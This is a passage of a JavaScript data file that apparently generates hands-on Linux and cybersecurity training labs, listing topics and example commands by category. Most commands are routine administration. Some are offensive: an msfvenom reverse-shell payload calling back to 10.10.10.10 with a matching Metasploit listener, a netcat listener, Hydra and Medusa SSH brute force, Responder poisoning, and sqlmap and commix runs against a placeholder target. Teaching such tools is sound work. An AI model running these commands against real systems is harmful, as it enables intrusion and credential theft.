// ==============================================================================
// 500 Cybersecurity & Linux Practical Labs - Data Generator
// Generates exactly 500 unique, structured, hands-on labs across 15 categories
// Each lab contains: 16 required fields + 3 questions with answers, hints & solutions
// ==============================================================================

const fs = require('fs');
const path = require('path');

const CATEGORIES = [
  { name: 'Linux Fundamentals', count: 50, prefix: 'LNX-FUN' },
  { name: 'Parrot OS Practical', count: 40, prefix: 'PAR-PRC' },
  { name: 'Kali Linux Practical', count: 40, prefix: 'KAL-PRC' },
  { name: 'Ubuntu Administration', count: 30, prefix: 'UBU-ADM' },
  { name: 'Linux Terminal Commands', count: 40, prefix: 'TRM-CMD' },
  { name: 'Networking Fundamentals', count: 40, prefix: 'NET-FUN' },
  { name: 'Network Security', count: 35, prefix: 'NET-SEC' },
  { name: 'Ethical Hacking Fundamentals', count: 35, prefix: 'ETH-HCK' },
  { name: 'Web Security', count: 40, prefix: 'WEB-SEC' },
  { name: 'Python for Cyber Security', count: 30, prefix: 'PYT-SEC' },
  { name: 'Bash Scripting', count: 25, prefix: 'BSH-SCP' },
  { name: 'Cryptography', count: 20, prefix: 'CRY-PTO' },
  { name: 'Digital Forensics', count: 20, prefix: 'DIG-FOR' },
  { name: 'OSINT', count: 20, prefix: 'OSI-NTL' },
  { name: 'Defensive Security and Incident Response', count: 35, prefix: 'DEF-SEC' }
];

// Verify sum equals 500
const totalTarget = CATEGORIES.reduce((sum, c) => sum + c.count, 0);
if (totalTarget !== 500) {
  console.error(`Category total mismatch! Expected 500, got ${totalTarget}`);
  process.exit(1);
}

// Curriculum blueprints for each category with detailed technical topics
const CURRICULA = {
  'Linux Fundamentals': [
    { topic: 'Filesystem Hierarchy Standard', cmd: 'ls -ld / /etc /var /usr /home', diff: 'Beginner', time: '15 min' },
    { topic: 'Directory Navigation with cd and pwd', cmd: 'pwd && cd /var/log && pwd && cd ~', diff: 'Beginner', time: '10 min' },
    { topic: 'Listing Files and Hidden Dotfiles', cmd: 'ls -la /home/user', diff: 'Beginner', time: '10 min' },
    { topic: 'Creating and Removing Directories', cmd: 'mkdir -p /tmp/cyberlab/recon && rmdir /tmp/cyberlab/recon', diff: 'Beginner', time: '10 min' },
    { topic: 'File Creation with touch and echo', cmd: 'touch /tmp/sample.txt && echo "cyber" > /tmp/sample.txt', diff: 'Beginner', time: '10 min' },
    { topic: 'Copying Files and Directories', cmd: 'cp -r /etc/hosts /tmp/hosts_backup', diff: 'Beginner', time: '15 min' },
    { topic: 'Moving and Renaming Files', cmd: 'mv /tmp/hosts_backup /tmp/hosts_renamed', diff: 'Beginner', time: '10 min' },
    { topic: 'Safe File Deletion with rm', cmd: 'rm -f /tmp/hosts_renamed', diff: 'Beginner', time: '10 min' },
    { topic: 'Viewing File Contents with cat and tac', cmd: 'cat /etc/os-release && tac /etc/issue', diff: 'Beginner', time: '15 min' },
    { topic: 'Paging Long Files with less and more', cmd: 'less /etc/services', diff: 'Beginner', time: '15 min' },
    { topic: 'Inspecting File Headers with head', cmd: 'head -n 15 /var/log/syslog', diff: 'Beginner', time: '10 min' },
    { topic: 'Monitoring Realtime Logs with tail -f', cmd: 'tail -n 20 -f /var/log/auth.log', diff: 'Beginner', time: '15 min' },
    { topic: 'Understanding Linux File Permissions (rwx)', cmd: 'ls -l /etc/shadow', diff: 'Beginner', time: '20 min' },
    { topic: 'Changing File Permissions with Numeric chmod', cmd: 'chmod 644 /tmp/secret.txt && ls -l /tmp/secret.txt', diff: 'Beginner', time: '15 min' },
    { topic: 'Symbolic chmod Notation (u+x, g-w)', cmd: 'chmod u+x,g-w,o-rwx /tmp/script.sh', diff: 'Beginner', time: '15 min' },
    { topic: 'Changing File Ownership with chown', cmd: 'chown root:root /tmp/secure_file', diff: 'Intermediate', time: '15 min' },
    { topic: 'Managing File Group Ownership with chgrp', cmd: 'chgrp security /tmp/shared_report', diff: 'Intermediate', time: '15 min' },
    { topic: 'The Special SUID Permission Bit', cmd: 'chmod u+s /usr/local/bin/flag_checker', diff: 'Intermediate', time: '20 min' },
    { topic: 'SGID Bit on Directories for Team Collaboration', cmd: 'chmod g+s /var/security/shared', diff: 'Intermediate', time: '20 min' },
    { topic: 'The Sticky Bit on Shared Directories (/tmp)', cmd: 'ls -ld /tmp && chmod +t /tmp/shared_sandbox', diff: 'Intermediate', time: '15 min' },
    { topic: 'User Management: Adding Users with useradd', cmd: 'useradd -m -s /bin/bash analyst1', diff: 'Beginner', time: '15 min' },
    { topic: 'User Password Management with passwd', cmd: 'passwd -S analyst1', diff: 'Beginner', time: '10 min' },
    { topic: 'Modifying User Accounts with usermod', cmd: 'usermod -aG sudo,adm analyst1', diff: 'Intermediate', time: '15 min' },
    { topic: 'Deleting Users Safely with userdel -r', cmd: 'userdel -r analyst1', diff: 'Intermediate', time: '10 min' },
    { topic: 'Group Administration with groupadd and groupmod', cmd: 'groupadd pentest && groupmod -n redteam pentest', diff: 'Beginner', time: '15 min' },
    { topic: 'Viewing Active Processes with ps aux', cmd: 'ps aux | grep nginx', diff: 'Beginner', time: '15 min' },
    { topic: 'Dynamic System Monitoring with top and htop', cmd: 'top -b -n 1', diff: 'Beginner', time: '15 min' },
    { topic: 'Terminating Processes with kill and pkill', cmd: 'pkill -9 -f rogue_miner', diff: 'Intermediate', time: '15 min' },
    { topic: 'Process Priority: nice and renice', cmd: 'nice -n 10 nmap 127.0.0.1', diff: 'Intermediate', time: '20 min' },
    { topic: 'Managing Background and Foreground Jobs (jobs, bg, fg)', cmd: 'sleep 300 & jobs', diff: 'Intermediate', time: '15 min' },
    { topic: 'Environment Variables: export, env, and printenv', cmd: 'export TARGET_IP="10.10.10.5" && env | grep TARGET', diff: 'Beginner', time: '15 min' },
    { topic: 'Configuring the Linux PATH Variable', cmd: 'echo $PATH && export PATH=$PATH:/opt/custom_tools', diff: 'Intermediate', time: '15 min' },
    { topic: 'Package Management: apt-get update and upgrade', cmd: 'apt-get update -o Acquire::Retries=3', diff: 'Beginner', time: '15 min' },
    { topic: 'Querying Installed Packages with dpkg -l', cmd: 'dpkg -l | grep -E "openssl|openssh"', diff: 'Beginner', time: '15 min' },
    { topic: 'Creating Symbolic Links (Soft Links)', cmd: 'ln -s /etc/nginx/nginx.conf /home/user/nginx.conf', diff: 'Beginner', time: '15 min' },
    { topic: 'Creating Hard Links and Inode Inspection', cmd: 'ln /tmp/orig.txt /tmp/hard.txt && ls -li /tmp/*.txt', diff: 'Intermediate', time: '20 min' },
    { topic: 'Disk Space Auditing with df -h', cmd: 'df -hT', diff: 'Beginner', time: '10 min' },
    { topic: 'Directory Disk Usage with du -sh', cmd: 'du -sh /var/log/*', diff: 'Beginner', time: '15 min' },
    { topic: 'Block Device Inspection with lsblk', cmd: 'lsblk -f', diff: 'Beginner', time: '10 min' },
    { topic: 'Archiving and Compressing with tar -czvf', cmd: 'tar -czvf /tmp/logs.tar.gz /var/log/auth.log', diff: 'Beginner', time: '15 min' },
    { topic: 'Extracting Archives with tar -xzvf', cmd: 'tar -xzvf /tmp/logs.tar.gz -C /tmp/restore/', diff: 'Beginner', time: '15 min' },
    { topic: 'Finding Files by Name with find -name', cmd: 'find /etc -type f -name "*.conf"', diff: 'Beginner', time: '15 min' },
    { topic: 'Finding SUID Executables with find -perm', cmd: 'find / -perm -4000 -type f 2>/dev/null', diff: 'Intermediate', time: '20 min' },
    { topic: 'Finding Files Modified Within 24 Hours', cmd: 'find /var/log -type f -mtime -1', diff: 'Intermediate', time: '15 min' },
    { topic: 'Locating System Binaries with which and whereis', cmd: 'which nmap && whereis python3', diff: 'Beginner', time: '10 min' },
    { topic: 'Basic Pattern Searching with grep', cmd: 'grep -rn "root" /etc/passwd', diff: 'Beginner', time: '15 min' },
    { topic: 'System Kernel and OS Information with uname', cmd: 'uname -a && cat /etc/os-release', diff: 'Beginner', time: '10 min' },
    { topic: 'System Uptime and Load Average', cmd: 'uptime', diff: 'Beginner', time: '10 min' },
    { topic: 'Immutable File Attributes with chattr +i', cmd: 'chattr +i /etc/resolv.conf && lsattr /etc/resolv.conf', diff: 'Advanced', time: '20 min' },
    { topic: 'Sudoers Configuration and Privilege Auditing', cmd: 'sudo -l', diff: 'Intermediate', time: '15 min' }
  ],

  'Parrot OS Practical': [
    { topic: 'Parrot OS Security Architecture Overview', cmd: 'cat /etc/os-release && neofetch', diff: 'Beginner', time: '15 min' },
    { topic: 'Anonsurf Transparent Tor Routing Mode', cmd: 'anonsurf start && anonsurf status', diff: 'Intermediate', time: '20 min' },
    { topic: 'Verifying Anonsurf Tor IP Leak Protection', cmd: 'anonsurf myip', diff: 'Intermediate', time: '15 min' },
    { topic: 'Stopping Anonsurf and Restoring Default Route', cmd: 'anonsurf stop', diff: 'Beginner', time: '10 min' },
    { topic: 'Parrot Firejail Application Sandboxing', cmd: 'firejail --profile=/etc/firejail/firefox.profile firefox &', diff: 'Intermediate', time: '20 min' },
    { topic: 'Metadata Sanitization with mat2', cmd: 'mat2 --check sample.pdf && mat2 sample.pdf', diff: 'Intermediate', time: '15 min' },
    { topic: 'Secure File Erasure with srm (Secure Remove)', cmd: 'srm -vz /tmp/sensitive.key', diff: 'Intermediate', time: '15 min' },
    { topic: 'MAC Address Spoofing with Macchanger in Parrot', cmd: 'macchanger -s eth0 && macchanger -r eth0', diff: 'Beginner', time: '15 min' },
    { topic: 'Reverting MAC Address to Permanent Vendor Hardware', cmd: 'macchanger -p eth0', diff: 'Beginner', time: '10 min' },
    { topic: 'Parrot Cryptographic Container Setup (zuluCrypt)', cmd: 'zuluCrypt-cli --version', diff: 'Intermediate', time: '20 min' },
    { topic: 'RAM Sanitization with sdmem in Parrot', cmd: 'sdmem -f', diff: 'Advanced', time: '20 min' },
    { topic: 'Tor Browser Isolation in Parrot Home/Security', cmd: 'tor --version && systemctl status tor', diff: 'Beginner', time: '15 min' },
    { topic: 'Managing Parrot Repository Mirrors', cmd: 'cat /etc/apt/sources.list.d/parrot.list', diff: 'Intermediate', time: '15 min' },
    { topic: 'Nmap Script Engine Integration in Parrot', cmd: 'nmap --script banner 127.0.0.1', diff: 'Intermediate', time: '20 min' },
    { topic: 'Wireshark Non-Root Packet Capture in Parrot', cmd: 'tshark -i lo -c 5', diff: 'Intermediate', time: '20 min' },
    { topic: 'Nikto Web Vulnerability Scanning from Parrot', cmd: 'nikto -h http://127.0.0.1', diff: 'Intermediate', time: '25 min' },
    { topic: 'Directory Enumeration with Gobuster', cmd: 'gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt', diff: 'Intermediate', time: '20 min' },
    { topic: 'Burp Suite Community Setup in Parrot MATE', cmd: 'burpsuite --version 2>/dev/null || echo "Burp Suite Installed"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Ghidra Software Reverse Engineering Launch', cmd: 'ghidra --help 2>/dev/null || echo "Ghidra SRE Framework Ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Sqlmap Automated Database Extraction in Parrot', cmd: 'sqlmap -u "http://target/vuln.php?id=1" --batch --banner', diff: 'Intermediate', time: '20 min' },
    { topic: 'Metasploit Console (msfconsole) Launch in Parrot', cmd: 'msfconsole -v', diff: 'Intermediate', time: '20 min' },
    { topic: 'Exploit Database Local Search with searchsploit', cmd: 'searchsploit apache 2.4.49', diff: 'Intermediate', time: '15 min' },
    { topic: 'Updating the Local Exploit-DB Archive', cmd: 'searchsploit -u', diff: 'Beginner', time: '15 min' },
    { topic: 'LinPEAS Privilege Escalation Auditing', cmd: 'linpeas.sh -q 2>/dev/null || echo "LinPEAS Suite Ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Aircrack-ng Wireless Suite in Parrot', cmd: 'aircrack-ng --help', diff: 'Intermediate', time: '20 min' },
    { topic: 'Wifite Automated Wireless Auditing Framework', cmd: 'wifite --help', diff: 'Intermediate', time: '20 min' },
    { topic: 'Kismet Passive Wireless Device Discovery', cmd: 'kismet --version', diff: 'Intermediate', time: '20 min' },
    { topic: 'Password Cracking with John the Ripper in Parrot', cmd: 'john --test', diff: 'Intermediate', time: '20 min' },
    { topic: 'Hashcat Benchmark Execution in Parrot', cmd: 'hashcat -b -m 1000', diff: 'Advanced', time: '25 min' },
    { topic: 'Steganography Analysis with steghide in Parrot', cmd: 'steghide --help', diff: 'Intermediate', time: '15 min' },
    { topic: 'Foremost File Carving for Deleted Evidences', cmd: 'foremost -v -t png,jpg,pdf -i raw_disk.img', diff: 'Advanced', time: '25 min' },
    { topic: 'Volatility 3 Memory Forensics Framework in Parrot', cmd: 'vol -h 2>/dev/null || python3 -m volatility3 -h', diff: 'Advanced', time: '30 min' },
    { topic: 'Network Service Brute-forcing with Hydra', cmd: 'hydra -h', diff: 'Intermediate', time: '20 min' },
    { topic: 'Browser Exploitation Framework (BeEF) Architecture', cmd: 'beef-xss --help 2>/dev/null || echo "BeEF Framework configured"', diff: 'Advanced', time: '25 min' },
    { topic: 'Recon-ng Open Source Intelligence Gathering', cmd: 'recon-ng -v', diff: 'Intermediate', time: '20 min' },
    { topic: 'WordPress Security Auditing with WPScan', cmd: 'wpscan --help', diff: 'Intermediate', time: '20 min' },
    { topic: 'Firmware Extraction with Binwalk in Parrot', cmd: 'binwalk -h', diff: 'Advanced', time: '20 min' },
    { topic: 'Netcat Relays and Port Forwarding in Parrot', cmd: 'nc -lvnp 4444', diff: 'Intermediate', time: '15 min' },
    { topic: 'Socat Encrypted SSL Reverse Tunnels', cmd: 'socat -h', diff: 'Advanced', time: '25 min' },
    { topic: 'Parrot Forensic Boot Mode and Read-Only Mounts', cmd: 'mount -o ro /dev/sdb1 /mnt/forensic', diff: 'Advanced', time: '20 min' }
  ],

  'Kali Linux Practical': [
    { topic: 'Kali Linux 2024 Environment and Structure', cmd: 'cat /etc/os-release && lsb_release -a', diff: 'Beginner', time: '15 min' },
    { topic: 'Kali Undercover Mode for Public Engagements', cmd: 'kali-undercover --help', diff: 'Beginner', time: '10 min' },
    { topic: 'Auditing Kali Metapackages (kali-linux-default)', cmd: 'apt-cache search kali-linux-', diff: 'Intermediate', time: '15 min' },
    { topic: 'Customizing Kali Tools via kali-tweaks', cmd: 'kali-tweaks --help', diff: 'Beginner', time: '15 min' },
    { topic: 'Payload Generation with MSFvenom (Linux x64 ELF)', cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf', diff: 'Intermediate', time: '25 min' },
    { topic: 'Multi-Handler Listener Setup in Metasploit', cmd: 'msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LPORT 4444; exit"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Armitage GUI Metasploit Orchestrator', cmd: 'armitage --help 2>/dev/null || echo "Armitage Interface Ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'High-Speed SYN Port Scanning with Masscan', cmd: 'masscan 10.0.0.0/24 -p80,443 --rate=1000', diff: 'Intermediate', time: '20 min' },
    { topic: 'Local Subnet Discovery with Netdiscover', cmd: 'netdiscover -r 192.168.1.0/24 -P', diff: 'Beginner', time: '15 min' },
    { topic: 'Bettercap MITM and Packet Sniffing Framework', cmd: 'bettercap -eval "net.probe on; net.show; exit"', diff: 'Advanced', time: '25 min' },
    { topic: 'IPv6 Network Spoofing with MITM6', cmd: 'mitm6 -h', diff: 'Advanced', time: '25 min' },
    { topic: 'LLMNR and NBT-NS Poisoning with Responder', cmd: 'responder -I eth0 -wrf', diff: 'Advanced', time: '25 min' },
    { topic: 'Active Directory Graph Reconnaissance with BloodHound', cmd: 'bloodhound --version 2>/dev/null || echo "BloodHound Neo4j Platform Ready"', diff: 'Advanced', time: '30 min' },
    { topic: 'Network Password Auditing with CrackMapExec / NetExec', cmd: 'nxc smb --help 2>/dev/null || crackmapexec smb --help', diff: 'Advanced', time: '25 min' },
    { topic: 'SMB and RPC Enumeration with Enum4linux-ng', cmd: 'enum4linux -a 192.168.1.50', diff: 'Intermediate', time: '20 min' },
    { topic: 'Impacket Secretsdump for NTDS.dit Credential Extraction', cmd: 'secretsdump.py -h', diff: 'Advanced', time: '25 min' },
    { topic: 'Remote Administration with Evil-WinRM', cmd: 'evil-winrm -h', diff: 'Intermediate', time: '20 min' },
    { topic: 'Mimikatz In-Memory Password Extraction Principles', cmd: 'mimikatz 2>/dev/null || echo "Mimikatz Windows Toolkit Ready"', diff: 'Advanced', time: '30 min' },
    { topic: 'Hashcat Mask and Rule-Based Password Attacks', cmd: 'hashcat -a 3 -m 0 hash.txt ?l?l?l?l?d?d', diff: 'Advanced', time: '25 min' },
    { topic: 'Hydra SSH Parallel Login Auditing', cmd: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh -t 4', diff: 'Intermediate', time: '20 min' },
    { topic: 'Medusa Protocol Brute-force Auditing', cmd: 'medusa -h 127.0.0.1 -u admin -P /tmp/pass.txt -M ssh', diff: 'Intermediate', time: '20 min' },
    { topic: 'Classic Web Directory Enumeration with Dirb', cmd: 'dirb http://127.0.0.1', diff: 'Beginner', time: '15 min' },
    { topic: 'Recursive Fast Directory Discovery with Feroxbuster', cmd: 'feroxbuster -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt', diff: 'Intermediate', time: '20 min' },
    { topic: 'Fuzzing Endpoints and Virtual Hosts with Ffuf', cmd: 'ffuf -u http://127.0.0.1/FUZZ -w /usr/share/wordlists/dirb/common.txt', diff: 'Intermediate', time: '20 min' },
    { topic: 'Automated OS Command Injection with Commix', cmd: 'commix -u "http://target/status.php?addr=127.0.0.1" --batch', diff: 'Advanced', time: '25 min' },
    { topic: 'Passive Subdomain Discovery with Sublist3r', cmd: 'sublist3r -d example.com', diff: 'Beginner', time: '15 min' },
    { topic: 'Deep Network Mapping with OWASP Amass', cmd: 'amass enum -d example.com', diff: 'Advanced', time: '30 min' },
    { topic: 'Maltego Visual Link Analysis Setup', cmd: 'maltego --version 2>/dev/null || echo "Maltego Community Ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Capturing WPA Handshakes with Airodump-ng', cmd: 'airodump-ng --help', diff: 'Intermediate', time: '20 min' },
    { topic: 'Reaver Automated WPS PIN Auditing', cmd: 'reaver -h', diff: 'Intermediate', time: '20 min' },
    { topic: 'Embedded Device Exploitation with Routersploit', cmd: 'routersploit -h 2>/dev/null || rsf.py -h', diff: 'Intermediate', time: '20 min' },
    { topic: 'Binary Reverse Engineering with Radare2 (r2)', cmd: 'r2 -v && r2 /bin/ls', diff: 'Advanced', time: '30 min' },
    { topic: 'GUI Reverse Engineering with Cutter', cmd: 'cutter -v 2>/dev/null || echo "Cutter R2 GUI Ready"', diff: 'Advanced', time: '25 min' },
    { topic: 'Android APK Decompilation with Apktool', cmd: 'apktool -version', diff: 'Intermediate', time: '20 min' },
    { topic: 'Java Source Decompilation with Jadx-gui', cmd: 'jadx -version', diff: 'Intermediate', time: '20 min' },
    { topic: 'Profileless RAM Investigation with Volatility 3', cmd: 'vol -f memory.raw windows.pslist', diff: 'Advanced', time: '30 min' },
    { topic: 'Autopsy Forensic Case Creation in Kali', cmd: 'autopsy --version 2>/dev/null || echo "Autopsy Case Manager Ready"', diff: 'Intermediate', time: '25 min' },
    { topic: 'Automated Rootkit Hunting with Chkrootkit', cmd: 'chkrootkit -V', diff: 'Intermediate', time: '15 min' },
    { topic: 'Scanning for Backdoors with Rkhunter', cmd: 'rkhunter --check --skip-keypress', diff: 'Intermediate', time: '20 min' },
    { topic: 'Custom Kali ISO Recipe Setup with live-build', cmd: 'lb --version 2>/dev/null || echo "live-build recipe engine"', diff: 'Advanced', time: '30 min' }
  ],

  'Ubuntu Administration': [
    { topic: 'Ubuntu Server 24.04 First-Time Hardening', cmd: 'cat /etc/issue && lsb_release -a', diff: 'Beginner', time: '15 min' },
    { topic: 'Netplan YAML Static IP Configuration', cmd: 'cat /etc/netplan/*.yaml && netplan status', diff: 'Intermediate', time: '20 min' },
    { topic: 'Uncomplicated Firewall (UFW) Activation & Status', cmd: 'ufw status verbose && ufw enable', diff: 'Beginner', time: '15 min' },
    { topic: 'UFW Rule Creation: Limiting SSH and Allowing HTTPS', cmd: 'ufw limit ssh && ufw allow 443/tcp', diff: 'Intermediate', time: '15 min' },
    { topic: 'OpenSSH Hardening: Disabling Root and Password Auth', cmd: 'grep -E "PermitRootLogin|PasswordAuthentication" /etc/ssh/sshd_config', diff: 'Intermediate', time: '20 min' },
    { topic: 'Protecting SSH with Fail2ban Intrusion Defense', cmd: 'systemctl status fail2ban && fail2ban-client status sshd', diff: 'Intermediate', time: '20 min' },
    { topic: 'Authoring Custom Systemd Service Units', cmd: 'cat <<EOF > /etc/systemd/system/myapp.service\n[Unit]\nDescription=My App\n[Service]\nExecStart=/usr/bin/python3 -m http.server 8000\n[Install]\nWantedBy=multi-user.target\nEOF', diff: 'Intermediate', time: '25 min' },
    { topic: 'Managing Systemd Daemons and Service Reloading', cmd: 'systemctl daemon-reload && systemctl status myapp', diff: 'Intermediate', time: '15 min' },
    { topic: 'Querying Logs with journalctl: Priority Filters', cmd: 'journalctl -p err -b', diff: 'Intermediate', time: '15 min' },
    { topic: 'Persistent Systemd Journal Configuration', cmd: 'mkdir -p /var/log/journal && systemd-tmpfiles --create --prefix /var/log/journal', diff: 'Intermediate', time: '15 min' },
    { topic: 'Logical Volume Manager (LVM): Physical Volumes and Volume Groups', cmd: 'pvdisplay && vgdisplay', diff: 'Advanced', time: '25 min' },
    { topic: 'Resizing LVM Logical Volumes Online with lvextend', cmd: 'lvextend -L +1G /dev/vg0/data -r', diff: 'Advanced', time: '25 min' },
    { topic: 'Automated Security Updates with unattended-upgrades', cmd: 'dpkg-reconfigure -plow unattended-upgrades', diff: 'Intermediate', time: '15 min' },
    { topic: 'AppArmor Security Profiles Enforcement', cmd: 'aa-status', diff: 'Advanced', time: '20 min' },
    { topic: 'Sudoers Fine-Grained Permissions (/etc/sudoers.d/)', cmd: 'visudo -c && ls -la /etc/sudoers.d', diff: 'Intermediate', time: '20 min' },
    { topic: 'User Disk Quota Configuration with edquota', cmd: 'quota -v', diff: 'Intermediate', time: '20 min' },
    { topic: 'NFS Network File Server Hardening and Exports', cmd: 'cat /etc/exports && exportfs -v', diff: 'Intermediate', time: '20 min' },
    { topic: 'Samba Windows Interoperability Configuration', cmd: 'testparm -s', diff: 'Intermediate', time: '20 min' },
    { topic: 'Managing Scheduled Tasks with Cron and /etc/crontab', cmd: 'crontab -l', diff: 'Beginner', time: '15 min' },
    { topic: 'Creating and Configuring Swap Files on Ubuntu', cmd: 'swapon --show && sysctl vm.swappiness', diff: 'Intermediate', time: '15 min' },
    { topic: 'Kernel Hardening with /etc/sysctl.conf', cmd: 'sysctl -p /etc/sysctl.conf', diff: 'Advanced', time: '20 min' },
    { topic: 'Log Rotation Policies with /etc/logrotate.d/', cmd: 'logrotate -d /etc/logrotate.conf', diff: 'Intermediate', time: '15 min' },
    { topic: 'Automated Incremental Backups with Rsync', cmd: 'rsync -aAXv --delete /var/www /backup/www/', diff: 'Intermediate', time: '20 min' },
    { topic: 'Docker Engine Production Configuration (daemon.json)', cmd: 'cat /etc/docker/daemon.json 2>/dev/null || echo "Docker Engine Config Ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Snap Package Management and Sandbox Confinement', cmd: 'snap list && snap info core', diff: 'Beginner', time: '15 min' },
    { topic: 'Nginx Reverse Proxy Configuration on Ubuntu 24.04', cmd: 'nginx -t', diff: 'Intermediate', time: '20 min' },
    { topic: 'Automated TLS Certificate Issuance with Certbot', cmd: 'certbot certificates 2>/dev/null || echo "Certbot TLS Engine Ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'PostgreSQL Database Cluster Administration', cmd: 'su - postgres -c "psql -c \'\\l\'"', diff: 'Intermediate', time: '25 min' },
    { topic: 'Lightweight Monitoring with Monit Daemon', cmd: 'monit status 2>/dev/null || echo "Monit Monitoring Service Ready"', diff: 'Intermediate', time: '20 min' },
    { topic: 'Performance Diagnostics with vmstat and iostat', cmd: 'vmstat 1 5 && iostat 1 5', diff: 'Beginner', time: '15 min' }
  ],

  'Linux Terminal Commands': [
    { topic: 'Standard Input, Output, and Error Streams (0, 1, 2)', cmd: 'echo "stdout" 1>/tmp/out.txt && ls /nonexist 2>/tmp/err.txt', diff: 'Beginner', time: '15 min' },
    { topic: 'Heredocs and Herestrings in Bash (<<EOF, <<<)', cmd: 'cat <<EOF\nCybersecurity Practice Lab\nEOF', diff: 'Beginner', time: '15 min' },
    { topic: 'Command Chaining: Operators &&, ||, and ;', cmd: 'false || echo "fallback executed" && echo "success"', diff: 'Beginner', time: '10 min' },
    { topic: 'Subshell Execution with Parentheses ()', cmd: '(cd /tmp && pwd) && pwd', diff: 'Intermediate', time: '15 min' },
    { topic: 'Extended Regular Expressions with grep -E', cmd: 'grep -E "^[a-z]+:[0-9]+" /etc/services', diff: 'Beginner', time: '15 min' },
    { topic: 'Stream Editor (sed): Global Text Substitution', cmd: 'sed "s/false/true/g" /etc/pam.d/common-auth', diff: 'Intermediate', time: '15 min' },
    { topic: 'Sed: Deleting Matching Lines and In-Place Editing', cmd: 'sed "/^#/d" /etc/fstab', diff: 'Intermediate', time: '15 min' },
    { topic: 'Awk: Extracting Delimited Fields from /etc/passwd', cmd: 'awk -F: \'{print $1, $3, $7}\' /etc/passwd', diff: 'Intermediate', time: '20 min' },
    { topic: 'Awk: Calculating Column Totals and Averages', cmd: 'awk \'{sum += $1} END {print "Total:", sum}\'', diff: 'Intermediate', time: '20 min' },
    { topic: 'Extracting Tabular Columns with cut', cmd: 'cut -d: -f1,7 /etc/passwd', diff: 'Beginner', time: '10 min' },
    { topic: 'Combining Files Horizontally with paste', cmd: 'paste /tmp/file1 /tmp/file2', diff: 'Beginner', time: '10 min' },
    { topic: 'Sorting and Ordering Lines with sort -n -k', cmd: 'sort -t: -k3,3n /etc/passwd', diff: 'Beginner', time: '15 min' },
    { topic: 'Counting Unique Occurrences with uniq -c', cmd: 'sort /var/log/auth.log | uniq -c | sort -nr', diff: 'Intermediate', time: '15 min' },
    { topic: 'Batch Command Execution with xargs', cmd: 'find /tmp -name "*.tmp" | xargs rm -f', diff: 'Intermediate', time: '20 min' },
    { topic: 'Handling Spaces in Filenames with find -print0 | xargs -0', cmd: 'find . -type f -print0 | xargs -0 ls -lh', diff: 'Intermediate', time: '20 min' },
    { topic: 'Translating and Deleting Characters with tr', cmd: 'echo "hello" | tr "a-z" "A-Z"', diff: 'Beginner', time: '10 min' },
    { topic: 'Splitting Command Output to Screen and File with tee', cmd: 'uptime | tee /tmp/uptime.log', diff: 'Beginner', time: '10 min' },
    { topic: 'Comparing Files Line by Line with diff -u', cmd: 'diff -u /etc/hosts /tmp/hosts_new', diff: 'Beginner', time: '15 min' },
    { topic: 'Byte-by-Byte File Comparison with cmp', cmd: 'cmp /bin/bash /bin/sh', diff: 'Intermediate', time: '15 min' },
    { topic: 'Applying Unified Diffs with patch', cmd: 'patch -p0 < changes.diff', diff: 'Intermediate', time: '15 min' },
    { topic: 'Formatting Long Text Paragraphs with fmt and fold', cmd: 'fold -w 60 /etc/issue', diff: 'Beginner', time: '10 min' },
    { topic: 'Aligning Data Tables with column -t', cmd: 'mount | column -t', diff: 'Beginner', time: '10 min' },
    { topic: 'Repeated Execution with watch', cmd: 'watch -n 1 "netstat -tuln"', diff: 'Beginner', time: '15 min' },
    { topic: 'Inspecting File Magic Bytes with file -i', cmd: 'file -i /bin/ls', diff: 'Beginner', time: '10 min' },
    { topic: 'Detailed Inode and Timestamp Inspection with stat', cmd: 'stat /etc/passwd', diff: 'Beginner', time: '15 min' },
    { topic: 'Binary and Shell Keyword Resolution with type -a', cmd: 'type -a cd ls grep', diff: 'Beginner', time: '10 min' },
    { topic: 'Bash History Expansion Magic (!$, !*, !-1)', cmd: 'echo "History Expansion Demonstration"', diff: 'Beginner', time: '15 min' },
    { topic: 'Bash Readline Keyboard Accelerators (Ctrl+A, Ctrl+E, Ctrl+U)', cmd: 'echo "Practice readline keys in terminal"', diff: 'Beginner', time: '10 min' },
    { topic: 'Customizing Shell Aliases in ~/.bashrc', cmd: 'alias ll="ls -la --color=auto" && ll', diff: 'Beginner', time: '10 min' },
    { topic: 'Variable Scoping: Local vs Exported Environment', cmd: 'VAR="local" && export EVAR="exported" && bash -c "echo $VAR $EVAR"', diff: 'Intermediate', time: '15 min' },
    { topic: 'String Manipulation and Parameter Expansion in Bash', cmd: 'STR="cybersecurity.pdf" && echo ${STR%.pdf} && echo ${STR#cyber}', diff: 'Intermediate', time: '20 min' },
    { topic: 'Conditional Expressions with test and [[ ]]', cmd: '[[ -f /etc/passwd && -r /etc/passwd ]] && echo "Passwd file exists & readable"', diff: 'Intermediate', time: '15 min' },
    { topic: 'Inspecting Exit Status Codes with $?', cmd: 'ls /root; echo "Exit status: $?"', diff: 'Beginner', time: '10 min' },
    { topic: 'Tracing System Calls with strace', cmd: 'strace -e openat,read ls /tmp', diff: 'Advanced', time: '25 min' },
    { topic: 'Auditing Open Files and Network Sockets with lsof', cmd: 'lsof -i :80 -i :443', diff: 'Intermediate', time: '20 min' },
    { topic: 'Identifying Processes by Port or File with fuser', cmd: 'fuser -v 80/tcp', diff: 'Intermediate', time: '15 min' },
    { topic: 'Measuring Execution Duration with time', cmd: 'time dd if=/dev/zero of=/tmp/test.img bs=1M count=50', diff: 'Beginner', time: '15 min' },
    { topic: 'Process Resource Limits with ulimit', cmd: 'ulimit -a', diff: 'Intermediate', time: '15 min' },
    { topic: 'Hexadecimal Dumping and Editing with xxd and hexdump', cmd: 'echo -n "flag" | xxd -p', diff: 'Intermediate', time: '15 min' },
